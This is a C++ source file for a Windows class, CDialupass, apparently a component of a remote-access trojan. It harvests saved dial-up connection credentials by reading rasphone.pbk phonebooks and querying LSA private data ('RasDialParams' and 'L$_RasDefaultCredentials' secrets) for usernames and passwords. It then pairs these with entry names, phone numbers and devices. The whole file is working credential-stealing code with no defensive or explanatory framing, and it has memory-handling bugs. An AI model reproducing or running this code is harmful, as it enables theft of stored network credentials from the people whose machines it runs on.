// Dialupass.cpp: implementation of the CDialupass class.
//
//////////////////////////////////////////////////////////////////////
#include "stdafx.h"
#include "Dialupass.h"
#include "../until.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CDialupass::CDialupass()
{
    m_nMax = 0;
	m_lpCurrentUser = GetCurrentLoginUser();
	m_nRasCount = GetRasEntryCount();
	m_PassWords = new PASSWORDS[m_nRasCount];
	OneInfo = new COneInfo* [m_nRasCount];
	m_nUsed = 0;
	m_nCount = 0;	
	GetRasEntries();
}

CDialupass::~CDialupass()
{
    for(int i=0; i<m_nRasCount; i++)
        delete OneInfo[i];
	delete m_PassWords;
	if (!m_lpCurrentUser)
		delete m_lpCurrentUser;
}

DWORD CDialupass::GetRasEntryCount()
{
	int		nCount = 0;
	char	*lpPhoneBook[2];
    char	szPhoneBook1[MAX_PATH+1], szPhoneBook2[MAX_PATH+1];
	GetWindowsDirectory(szPhoneBook1, sizeof(szPhoneBook1));
	lstrcpy(strchr(szPhoneBook1, '\\') + 1, "Documents and Settings\\");
	lstrcat(szPhoneBook1, m_lpCurrentUser);
	lstrcat(szPhoneBook1, "\\Application Data\\Microsoft\\Network\\Connections\\pbk\\rasphone.pbk");
    SHGetSpecialFolderPath(NULL,szPhoneBook2, 0x23, 0);
	wsprintf(szPhoneBook2, "%s\\%s", szPhoneBook2, "Microsoft\\Network\\Connections\\pbk\\rasphone.pbk");

	lpPhoneBook[0] = szPhoneBook1;
	lpPhoneBook[1] = szPhoneBook2;

	DWORD	nSize = 1024 * 4;
	char	*lpszReturnBuffer = new char[nSize];

	for (int i = 0; i < sizeof(lpPhoneBook) / sizeof(int); i++)
	{
		memset(lpszReturnBuffer, 0, nSize);
		GetPrivateProfileSectionNames(lpszReturnBuffer, nSize, lpPhoneBook[i]);
		for(char *lpSection = lpszReturnBuffer; *lpSection != '\0'; lpSection += lstrlen(lpSection) + 1)
		{
			nCount++;
		}
	}
	delete lpszReturnBuffer;
	return nCount;
}

LPTSTR CDialupass::GetLocalSid()
{
	union
	{
	SID s;
	char c[256];
	}Sid;
	DWORD sizeSid=sizeof(Sid);
	char DomainName[256];
	DWORD sizeDomainName=sizeof(DomainName);
	SID_NAME_USE peUse;
	LPSTR pSid;


	if (m_lpCurrentUser == NULL)
		return NULL;

	if(!LookupAccountName(NULL,m_lpCurrentUser,(SID*)&Sid,&sizeSid,DomainName,&sizeDomainName,&peUse))return NULL;
	if(!IsValidSid(&Sid))return NULL;


	typedef BOOL  (WINAPI *ConvertSid2StringSid)(PSID  , LPTSTR *);
	ConvertSid2StringSid proc;
	HINSTANCE	hLibrary = LoadLibrary("advapi32.dll");
	proc = (ConvertSid2StringSid) GetProcAddress(hLibrary, "ConvertSidToStringSidA");
	if(proc)   proc((SID*)&Sid.s,&pSid);
	FreeLibrary(hLibrary);
	return pSid;
}


void CDialupass::AnsiStringToLsaStr(LPSTR AValue,PLSA_UNICODE_STRING lsa)
{
	lsa->Length=lstrlen(AValue)*2;
	lsa->MaximumLength=lsa->Length+2;
	lsa->Buffer=(PWSTR)malloc(lsa->MaximumLength);
	MultiByteToWideChar(NULL,NULL,(LPCSTR)AValue,lstrlen(AValue),lsa->Buffer,lsa->MaximumLength);
}


PLSA_UNICODE_STRING CDialupass::GetLsaData(LPSTR KeyName)
{
	LSA_OBJECT_ATTRIBUTES LsaObjectAttribs;
	LSA_HANDLE LsaHandle;
	LSA_UNICODE_STRING LsaKeyName;
	NTSTATUS nts;
	PLSA_UNICODE_STRING OutData;

	ZeroMemory(&LsaObjectAttribs,sizeof(LsaObjectAttribs));
	nts=LsaOpenPolicy(NULL,&LsaObjectAttribs,POLICY_GET_PRIVATE_INFORMATION,&LsaHandle);
	if(nts!=0)return NULL;
	AnsiStringToLsaStr(KeyName, &LsaKeyName);
	nts=LsaRetrievePrivateData(LsaHandle, &LsaKeyName,&OutData);
	if(nts!=0)return NULL;
	nts=LsaClose(LsaHandle);
	if(nts!=0)return NULL;
	return OutData;
}
/////////
void CDialupass::ParseLsaBuffer(LPCWSTR Buffer,USHORT Length)
{
	char AnsiPsw[1024];
	char chr,PswStr[256];
	PswStr[0]=0;
	WideCharToMultiByte(0,NULL,Buffer,Length,AnsiPsw,1024,0,0);

	for(int i=0,SpacePos=0,TXT=0;i<Length/2-2;i++)
	{
	  chr=AnsiPsw[i];
	  if(chr==0)
	  {
		SpacePos++;
		switch(SpacePos)
		{
			case 1:
			PswStr[TXT]=chr;
			strcpy(m_PassWords[m_nUsed].UID,PswStr);
			break;
			case 6:
			PswStr[TXT]=chr;
			strcpy(m_PassWords[m_nUsed].login,PswStr);
			break;
			case 7:
			PswStr[TXT]=chr;
			strcpy(m_PassWords[m_nUsed].pass,PswStr);
			m_PassWords[m_nUsed].used=false;
			m_nUsed++;
			break;
		}
		ZeroMemory(PswStr,256);
		TXT=0;
	  }
	  else 
	  {
		PswStr[TXT]=chr;
		TXT++;
	  }
	  if(SpacePos==9)SpacePos=0;
	}
}
///////////
void CDialupass::GetLsaPasswords()
{
	PLSA_UNICODE_STRING PrivateData;
	char Win2k[]="RasDialParams!%s#0";
	char WinXP[]="L$_RasDefaultCredentials#0";
	char temp[256];

	wsprintf(temp,Win2k,GetLocalSid());

	PrivateData=GetLsaData(temp);
	if(PrivateData!=NULL)
	{
	ParseLsaBuffer(PrivateData->Buffer,PrivateData->Length);
	LsaFreeMemory(PrivateData->Buffer); 
	}

	PrivateData=GetLsaData(WinXP);
	if(PrivateData!=NULL)
	{ 
	ParseLsaBuffer(PrivateData->Buffer,PrivateData->Length);
	LsaFreeMemory(PrivateData->Buffer); 
	}
}


bool CDialupass::GetRasEntries()
{

	int		nCount = 0;
	char	*lpPhoneBook[2];
    char	szPhoneBook1[MAX_PATH+1], szPhoneBook2[MAX_PATH+1];
	GetWindowsDirectory(szPhoneBook1, sizeof(szPhoneBook1));
	lstrcpy(strchr(szPhoneBook1, '\\') + 1, "Documents and Settings\\");
	lstrcat(szPhoneBook1, m_lpCurrentUser);
	lstrcat(szPhoneBook1, "\\Application Data\\Microsoft\\Network\\Connections\\pbk\\rasphone.pbk");
    SHGetSpecialFolderPath(NULL,szPhoneBook2, 0x23, 0);
	wsprintf(szPhoneBook2, "%s\\%s", szPhoneBook2, "Microsoft\\Network\\Connections\\pbk\\rasphone.pbk");
	
	lpPhoneBook[0] = szPhoneBook1;
	lpPhoneBook[1] = szPhoneBook2;
	
	
	OSVERSIONINFO osi;
	osi.dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
    GetVersionEx(&osi);
	
	if(osi.dwPlatformId == VER_PLATFORM_WIN32_NT && osi.dwMajorVersion >= 5)
	{
		GetLsaPasswords();
	}	

	DWORD	nSize = 1024 * 4;
	char	*lpszReturnBuffer = new char[nSize];

	for (int i = 0; i < sizeof(lpPhoneBook) / sizeof(int); i++)
	{
		memset(lpszReturnBuffer, 0, nSize);
		GetPrivateProfileSectionNames(lpszReturnBuffer, nSize, lpPhoneBook[i]);
		for(char *lpSection = lpszReturnBuffer; *lpSection != '\0'; lpSection += lstrlen(lpSection) + 1)
		{	
			char	*lpRealSection = (char *)UTF8ToGB2312(lpSection);
			char	strDialParamsUID[256];
			char	strUserName[256];
			char	strPassWord[256];
			char	strPhoneNumber[256];
			char	strDevice[256];
			memset(strDialParamsUID, 0, sizeof(strDialParamsUID));
			memset(strUserName, 0, sizeof(strUserName));
			memset(strPassWord, 0, sizeof(strPassWord));
			memset(strPhoneNumber, 0, sizeof(strPhoneNumber));
			memset(strDevice, 0, sizeof(strDevice));


			int	nBufferLen = GetPrivateProfileString(lpSection, "DialParamsUID", 0, 
				strDialParamsUID, sizeof(strDialParamsUID),	lpPhoneBook[i]);

			if (nBufferLen > 0)//DialParamsUID=4326020    198064
			{
				for(int j=0; j< (int)m_nRasCount; j++)
				{
					if(lstrcmp(strDialParamsUID, m_PassWords[j].UID)==0)
					{
						lstrcpy(strUserName, m_PassWords[j].login); 
						lstrcpy(strPassWord, m_PassWords[j].pass); 
						m_PassWords[j].used=true;
						m_nUsed++;
						break;
					}
				}
			}

			GetPrivateProfileString(lpSection, "PhoneNumber", 0, 
				strPhoneNumber, sizeof(strDialParamsUID),	lpPhoneBook[i]);
			GetPrivateProfileString(lpSection, "Device", 0, 
				strDevice, sizeof(strDialParamsUID),	lpPhoneBook[i]);
			char *lpRealDevice = (char *)UTF8ToGB2312(strDevice);
			char *lpRealUserName = (char *)UTF8ToGB2312(strUserName);
	 		Set(strDialParamsUID, lpRealSection, lpRealUserName, strPassWord,
 			strPhoneNumber, lpRealDevice);
			delete	lpRealSection;
			delete	lpRealUserName;
			delete	lpRealDevice;
		}
	}
	delete lpszReturnBuffer;

	return true;
}

BOOL CDialupass::Set(char *DialParamsUID, char *Name,char *User,char *Password,char *PhoneNumber, char *Device)
{
	for(int i=0; i<m_nMax; i++){
        if(0==strcmp(OneInfo[i]->Get(STR_DialParamsUID), DialParamsUID)){

            if(Name!=NULL)
                OneInfo[i]->Set(STR_Name,Name);
            if(User!=NULL)
                OneInfo[i]->Set(STR_User,User);
            if(Password!=NULL)
                OneInfo[i]->Set(STR_Password,Password);
            if(PhoneNumber!=NULL)
                OneInfo[i]->Set(STR_PhoneNumber,PhoneNumber);
            if(Device!=NULL)
                OneInfo[i]->Set(STR_Device, Device);
            return TRUE;
        }
    }

    if(m_nMax < m_nRasCount){

        OneInfo[m_nMax] = new COneInfo;
		OneInfo[m_nMax]->Set(STR_DialParamsUID,DialParamsUID);
        OneInfo[m_nMax]->Set(STR_Name,Name);
        OneInfo[m_nMax]->Set(STR_User,User);
        OneInfo[m_nMax]->Set(STR_Password,Password);
        OneInfo[m_nMax]->Set(STR_PhoneNumber,PhoneNumber);
        OneInfo[m_nMax]->Set(STR_Device,Device);
        m_nMax ++;
        return TRUE;
    }
	return false;
}

LPCTSTR CDialupass::UTF8ToGB2312(char UTF8Str[])
{
	if (UTF8Str == NULL || lstrlen(UTF8Str) == 0)
		return "";
	int	nStrLen = lstrlen(UTF8Str) * 2;
	char *lpWideCharStr = new char[nStrLen];
	char *lpMultiByteStr = new char[nStrLen];

	MultiByteToWideChar(CP_UTF8, 0, UTF8Str, -1, (LPWSTR)lpWideCharStr, nStrLen);
	WideCharToMultiByte(CP_ACP, 0, (LPWSTR)lpWideCharStr, -1, lpMultiByteStr, nStrLen, 0, 0);

	delete lpWideCharStr;
	return lpMultiByteStr;
}
